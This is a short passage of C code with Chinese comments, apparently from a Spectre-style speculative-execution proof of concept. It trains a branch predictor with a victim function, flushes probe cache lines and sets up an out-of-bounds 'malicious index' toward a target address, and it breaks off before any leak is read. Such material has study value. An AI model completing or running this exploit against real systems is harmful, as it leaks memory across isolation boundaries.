    for (int i = 0; i < 100; i++) {
        victim_function(i % PROBE_SIZE); // 始终合法
    }
}

// 读取目标内存的某一位
char read_bit(uint8_t *target_addr, int bit) {
    // 清空probe缓存
    for (int i = 0; i < PROBE_SIZE; i++) {
        _mm_clflush(&probe[i * 4096]);
    }
    _mm_mfence();

    // 构造越界索引，使得推测执行中访问 target_addr
    size_t malicious_index = (size_t)target_addr - (size_t)probe; // 假设probe地址已知
    // 实际中需要计算偏移，此处简化

